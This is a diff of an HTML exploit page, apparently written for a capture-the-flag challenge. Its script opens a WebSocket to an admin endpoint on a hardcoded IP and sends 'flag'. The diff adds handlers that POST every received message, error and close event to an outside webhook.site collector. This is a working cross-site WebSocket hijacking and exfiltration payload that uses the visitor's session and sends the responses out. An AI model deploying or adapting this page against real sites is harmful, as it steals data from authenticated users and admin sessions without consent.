@@ -5,7 +5,15 @@
 <body>
   <script>    
       const ws = new WebSocket(`wss://65.109.185.79:1202/admin/ws`);
-    
+
+     ws.onerror = (e) => {
+       fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`, {
+          method: `POST`,
+          mode: `no-cors`,
+          body: `there is an error ${e}`
+        });
+     }
+      
       ws.onopen = () => {
         fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`, {
           method: `POST`,
@@ -14,9 +22,21 @@
         });
         ws.send("flag");
       }
+
+      ws.onclose = (e) => {
+        fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`, {
+          method: `POST`,
+          mode: `no-cors`,
+          body: `code= ${e.code} -=- reason= ${e.reason}`
+        });        
+      }
     
       ws.onmessage = (event) => {
-        fetch("https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6");
+        fetch(`https://webhook.site/19995222-48eb-4a16-9239-6fd4fb51f9f6`, {
+          method: `POST`,
+          mode: `no-cors`,
+          body: `message= ${event.data}`
+        });
       };
     
   </script>
